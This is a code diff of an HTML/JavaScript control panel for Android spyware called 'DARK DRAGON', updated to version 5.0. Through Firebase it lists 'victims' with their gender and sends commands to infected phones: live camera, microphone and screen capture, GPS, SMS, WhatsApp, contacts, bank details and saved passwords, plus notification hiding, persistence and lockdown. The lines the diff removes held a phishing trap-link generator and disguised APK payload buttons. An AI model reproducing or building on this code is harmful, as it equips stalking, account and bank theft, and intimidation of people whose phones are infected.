@@ -2,7 +2,7 @@
 <html lang="si">
 <head>
     <meta charset="UTF-8">
-    <title>DARK DRAGON | ULTIMATE SYSTEM v2.0 [STABLE]</title>
+    <title>DARK DRAGON | ULTIMATE SYSTEM v5.0 [MASTER]</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
@@ -34,18 +34,13 @@
         .card::before { content: ""; position: absolute; top: 0; left: 0; width: 4px; height: 100%; background: var(--neon-red); }
         .card h3 { margin-top: 0; color: var(--gold); border-bottom: 1px solid var(--dark-red); padding-bottom: 10px; font-size: 15px; }
 
-        /* Radar UI */
-        .radar-box { width: 120px; height: 120px; border: 2px solid var(--green); border-radius: 50%; margin: 10px auto; position: relative; }
-        .radar-sweep { width: 100%; height: 100%; background: conic-gradient(from 0deg, transparent 0%, rgba(0, 255, 0, 0.4) 10%, transparent 20%); animation: sweep 3s linear infinite; border-radius: 50%; }
-        @keyframes sweep { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        /* Buttons */
-        button { background: #220000; color: var(--neon-red); border: 1px solid var(--neon-red); padding: 8px 12px; font-weight: bold; cursor: pointer; font-size: 10px; border-radius: 4px; transition: 0.3s; }
-        button:hover { background: var(--neon-red); color: black; }
         .btn-danger { border-color: #ff4444; color: #ff4444; }
         .btn-special { border-color: var(--purple); color: var(--purple); }
         .btn-cyan { border-color: var(--cyan); color: var(--cyan); }
+        button { background: #220000; color: var(--neon-red); border: 1px solid var(--neon-red); padding: 8px 12px; font-weight: bold; cursor: pointer; font-size: 10px; border-radius: 4px; transition: 0.3s; margin: 2px; }
+        button:hover { background: var(--neon-red); color: black; }
 
+        .timeline-box { height: 150px; overflow-y: auto; background: #000; border: 1px solid var(--dark-red); padding: 10px; font-size: 10px; color: var(--green); }
         .live-stream { width: 100%; height: 150px; background: #000; border: 1px solid var(--cyan); display: flex; align-items: center; justify-content: center; font-size: 10px; color: var(--cyan); }
         table { width: 100%; border-collapse: collapse; font-size: 11px; color: white; }
         th, td { border: 1px solid var(--dark-red); padding: 8px; text-align: left; }
@@ -56,7 +51,7 @@
 <canvas id="matrixCanvas"></canvas>
 
 <div id="login-box">
-    <h1>DRAGON SYSTEM ACCESS</h1>
+    <h1>DRAGON SYSTEM ACCESS v5.0</h1>
     <input type="email" id="admin-email" placeholder="ADMIN EMAIL">
     <input type="password" id="admin-password" placeholder="MASTER CODE">
     <br><br>
@@ -64,18 +59,18 @@
 </div>
 
 <div id="dashboard">
-    <header><h3>DRAGON REMOTE COMMAND INTERFACE v4.6</h3></header>
+    <header><h3>DRAGON REMOTE COMMAND INTERFACE v5.0 [MASTER]</h3></header>
     <div class="target-status">
-        <span>🛰️ LOCKED: <b id="active-target-display" style="color:var(--cyan)">NONE</b></span>
+        <span>🛰️ LOCKED: <b id="active-target-display" style="color:var(--cyan)">NONE</b> | GENDER: <span id="gender-display" style="color:var(--gold)">---</span></span>
         <button id="deselect-btn" style="display:none; margin-left:15px;" onclick="deselectTarget()">DESELECT</button>
     </div>
 
     <div class="tabs">
         <div class="tab active" onclick="showTab(event, 'radar-panel')">🛰️ RADAR</div>
         <div class="tab" onclick="showTab(event, 'victims-panel')">👥 NODES</div>
-        <div class="tab" onclick="showTab(event, 'infection-panel')">💉 INFECTION</div>
-        <div class="tab" onclick="showTab(event, 'spy-panel')">👁️ SPY</div>
-        <div class="tab" onclick="showTab(event, 'extract-panel')">📂 DATA</div>
+        <div class="tab" onclick="showTab(event, 'spy-panel')">👁️ LIVE SPY</div>
+        <div class="tab" onclick="showTab(event, 'extract-panel')">📂 DATA/BANK</div>
+        <div class="tab" onclick="showTab(event, 'ghost-panel')">👻 GHOST/VOICE</div>
         <div class="tab" onclick="showTab(event, 'sys-panel')">💀 SYSTEM</div>
     </div>
 
@@ -83,45 +78,22 @@
         
         <div id="radar-panel" class="panel active">
             <div class="card">
-                <h3>🛰️ LIVE SCANNER</h3>
-                <div class="radar-box"><div class="radar-sweep"></div></div>
-                <p style="text-align:center; color:var(--green)">Nodes: <span id="online-count">0</span></p>
-                <div id="log-container" style="height:120px; overflow-y:auto; color:var(--green); font-size:10px;"></div>
+                <h3>📊 ACTIVITY TIMELINE</h3>
+                <div class="timeline-box" id="activity-timeline">Waiting for victim data...</div>
             </div>
             <div class="card">
-                <h3>📍 TRACER</h3>
-                <div class="live-stream" style="border:1px dashed var(--gold); color:var(--gold)">MAP SIGNAL WAITING...</div>
+                <h3>📍 LIVE TRACER</h3>
+                <div class="live-stream" id="map-signal">MAP SIGNAL WAITING...</div>
                 <button style="width:100%; margin-top:10px;" onclick="sendCommand('get_location')">GET GPS</button>
             </div>
         </div>
 
         <div id="victims-panel" class="panel">
             <div class="card" style="grid-column: 1 / -1;">
-                <h3>👥 ACTIVE CONNECTIONS</h3>
+                <h3>👥 NODES (GENDER & ID ENABLED)</h3>
                 <table>
-                    <thead><tr><th>TARGET</th><th>DEVICE</th><th>ACTION</th></tr></thead>
+                    <thead><tr><th>EMAIL/ID</th><th>DEVICE</th><th>GENDER</th><th>ACTION</th></tr></thead>
                     <tbody id="victim-list"></tbody>
-                </table>
-            </div>
-        </div>
-
-        <div id="infection-panel" class="panel">
-            <div class="card">
-                <h3>🐈 CAT TRAP (LINK)</h3>
-                <input type="text" id="trap-name" placeholder="Target Name" style="width:90%">
-                <button class="btn-cyan" onclick="generateTrap()">GENERATE SECURE LINK</button>
-                <p id="link-display" style="font-size:10px; color:var(--cyan); margin-top:10px; word-break:break-all; padding:5px; background:rgba(0,0,0,0.5);"></p>
-            </div>
-            <div class="card">
-                <h3>📦 PAYLOADS (APK)</h3>
-                <button class="btn-special" style="width:100%; margin-bottom:5px;" onclick="alert('Infecting Lightroom Pro Payload...')">📸 LIGHTROOM PRO APK</button>
-                <button class="btn-special" style="width:100%;" onclick="alert('Stealth Payload v1 Ready')">💀 STEALTH PAYLOAD v1</button>
-            </div>
-            <div class="card" style="grid-column: 1 / -1;">
-                <h3>📊 WEB TRAP LOGS (IP/LOC)</h3>
-                <table id="trap-logs">
-                    <thead><tr><th>NAME</th><th>IP</th><th>CITY</th><th>TIME</th></tr></thead>
-                    <tbody id="trap-list"></tbody>
                 </table>
             </div>
         </div>
@@ -129,39 +101,63 @@
         <div id="spy-panel" class="panel">
             <div class="card">
                 <h3>📸 LIVE CAMERA</h3>
-                <div class="live-stream">READY</div>
+                <div class="live-stream" id="camera-viewer">READY</div>
                 <div style="margin-top:10px; display:flex; gap:5px;">
                     <button onclick="sendCommand('cam_front')">FRONT</button>
                     <button onclick="sendCommand('cam_back')">BACK</button>
+                    <button class="btn-cyan" onclick="sendCommand('screen_mirror')">MIRROR SCREEN</button>
                 </div>
             </div>
             <div class="card">
-                <h3>🎙️ MIC</h3>
-                <button onclick="sendCommand('mic_record')" style="width:100%">START MONITORING</button>
+                <h3>🎙️ MIC & AUDIO</h3>
+                <button onclick="sendCommand('mic_record')" style="width:100%">LISTEN LIVE</button>
+                <button onclick="sendCommand('get_incognito_history')" style="width:100%; margin-top:10px;" class="btn-cyan">EXTRACT INCOGNITO HISTORY</button>
             </div>
         </div>
 
         <div id="extract-panel" class="panel">
             <div class="card">
-                <h3>📂 FILES & MESSAGES</h3>
+                <h3>💳 BANKING & PASSWORDS</h3>
+                <button class="btn-special" onclick="sendCommand('get_bank_data')">EXTRACT BANK DETAILS</button>
+                <button class="btn-special" onclick="sendCommand('get_passwords')">VIEW SAVED PASSWORDS</button>
+            </div>
+            <div class="card">
+                <h3>📂 FILES</h3>
                 <button onclick="sendCommand('get_sms')">SMS</button>
                 <button onclick="sendCommand('get_whatsapp')">WA DB</button>
-                <button onclick="sendCommand('get_calls')">CALLS</button>
                 <button onclick="sendCommand('get_contacts')">CONTACTS</button>
+            </div>
+        </div>
+
+        <div id="ghost-panel" class="panel">
+            <div class="card">
+                <h3>👻 GHOST MODE</h3>
+                <button class="btn-cyan" onclick="sendCommand('notif_off')">NOTIFICATIONS OFF</button>
+                <button class="btn-cyan" onclick="sendCommand('notif_on')">NOTIFICATIONS ON</button>
+                <p style="font-size: 10px; color: var(--cyan);">* Shadow Mirroring Active</p>
+            </div>
+            <div class="card">
+                <h3>🎤 VOICE CHANGER INTERCOM</h3>
+                <select id="voice-type" style="background:#000; color:var(--purple); border:1px solid var(--purple); width:100%; padding:5px;">
+                    <option value="demon">Demon Voice</option>
+                    <option value="robot">Robot Voice</option>
+                    <option value="anonymous">Anonymous Voice</option>
+                </select>
+                <button class="btn-special" style="width:100%; margin-top:10px;" onclick="sendCommand('start_intercom')">START INTERCOM</button>
             </div>
         </div>
 
         <div id="sys-panel" class="panel">
             <div class="card">
-                <h3>💀 DESTRUCTION</h3>
-                <button class="btn-danger" onclick="sendCommand('lock_device')">LOCK</button>
-                <button class="btn-danger" onclick="sendCommand('reboot')">REBOOT</button>
-                <button class="btn-danger" onclick="sendCommand('factory_reset')">WIPE</button>
+                <h3>💀 DESTRUCTION & PERSISTENCE</h3>
+                <button class="btn-danger" onclick="sendCommand('nuclear_lockdown')">NUCLEAR LOCKDOWN (GLITCH)</button>
+                <button class="btn-danger" onclick="sendCommand('reset_lock')">REMOTE LOCK RESET</button>
+                <button class="btn-special" onclick="sendCommand('set_immortal')">ACTIVATE IMMORTAL MODE</button>
             </div>
             <div class="card">
                 <h3>🛠️ MISC</h3>
-                <button onclick="sendCommand('torch_on')">FLASH</button>
                 <button onclick="sendCommand('vibrate')">VIBRATE</button>
+                <button class="btn-danger" onclick="sendCommand('uninstall_self')">TERMINATE SYSTEM (KILL-SWITCH)</button>
             </div>
         </div>
 
@@ -186,74 +182,58 @@
 
     function initApp() {
         loadVictims();
-        loadTrapLogs();
+        // Matrix Canvas Background
+        setInterval(draw, 50);
     }
 
     function loadVictims() {
         db.ref('victims').on('value', (snap) => {
             const list = document.getElementById('victim-list');
             list.innerHTML = "";
-            let count = 0;
-            snap.forEach((child) => {
-                count++;
-                const v = child.val();
-                list.innerHTML += `<tr><td>${v.target}</td><td>${v.device}</td>
-                <td><button onclick="selectTarget('${child.key}', '${v.target}')">SELECT</button></td></tr>`;
-            });
-            document.getElementById('online-count').innerText = count;
-        });
-    }
-
-    function loadTrapLogs() {
-        db.ref('trap_logs').on('value', (snap) => {
-            const list = document.getElementById('trap-list');
-            list.innerHTML = "";
             snap.forEach((child) => {
                 const v = child.val();
-                list.innerHTML += `<tr><td>${v.name}</td><td>${v.ip}</td><td>${v.city}</td><td>${v.time}</td></tr>`;
+                const genderIcon = v.gender === 'girl' ? '👧' : '👦';
+                list.innerHTML += `<tr>
+                    <td>${v.email || v.target}</td>
+                    <td>${v.device}</td>
+                    <td>${genderIcon} ${v.gender || 'Unknown'}</td>
+                    <td><button onclick="selectTarget('${child.key}', '${v.target}', '${v.gender}')">SELECT</button></td>
+                </tr>`;
             });
         });
     }
 
     window.activeTarget = null;
-    function selectTarget(key, name) {
+    function selectTarget(key, name, gender) {
         window.activeTarget = key;
         document.getElementById('active-target-display').innerText = name;
+        document.getElementById('gender-display').innerText = gender ? gender.toUpperCase() : 'UNKNOWN';
         document.getElementById('deselect-btn').style.display = "inline-block";
-        logActivity(`Locked on: ${name}`);
+        loadActivity(key);
     }
 
     function deselectTarget() {
         window.activeTarget = null;
         document.getElementById('active-target-display').innerText = "NONE";
+        document.getElementById('gender-display').innerText = "---";
         document.getElementById('deselect-btn').style.display = "none";
     }
 
+    function loadActivity(targetId) {
+        db.ref('activity/' + targetId).limitToLast(10).on('value', (snap) => {
+            const box = document.getElementById('activity-timeline');
+            box.innerHTML = "";
+            snap.forEach(child => {
+                const act = child.val();
+                box.innerHTML = `<div>[${act.time}] ${act.event}</div>` + box.innerHTML;
+            });
+        });
+    }
+
     function sendCommand(cmd) {
-        if(!window.activeTarget) return alert("SELECT A TARGET!");
+        if(!window.activeTarget) return alert("SELECT A TARGET FIRST!");
         db.ref('commands/' + window.activeTarget).set({ action: cmd, time: Date.now() });
-        logActivity(`Sent: ${cmd}`);
-    }
-
-    // --- 404 FIX LOGIC FOR GITHUB PAGES ---
-    function generateTrap() {
-        const name = document.getElementById('trap-name').value;
-        if(!name) return alert("Name Required!");
-        
-        // GitHub Pages වලට ගැලපෙන විදිහට path එක නිවැරදිව හදනවා
-        let baseUrl = window.location.href.split('?')[0].split('#')[0];
-        let baseDir = baseUrl.substring(0, baseUrl.lastIndexOf('/'));
-        
-        // අන්තිමට trap.html අනිවාර්යයෙන්ම එකතු කරනවා
-        const finalLink = baseDir + "/trap.html?id=" + btoa(name);
-        
-        document.getElementById('link-display').innerText = finalLink;
-        logActivity(`Trap Link Generated: ${name}`);
-    }
-
-    function logActivity(msg) {
-        const log = document.getElementById('log-container');
-        log.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}<br>` + log.innerHTML;
+        alert("Command Sent: " + cmd);
     }
 
     function showTab(evt, id) {
@@ -263,6 +243,7 @@
         evt.currentTarget.classList.add('active');
     }
 
+    // Matrix Logic
     const canvas = document.getElementById('matrixCanvas');
     const ctx = canvas.getContext('2d');
     canvas.width = window.innerWidth; canvas.height = window.innerHeight;
@@ -276,7 +257,6 @@
             drops[i]++;
         });
     }
-    setInterval(draw, 50);
 </script>
 </body>
 </html>
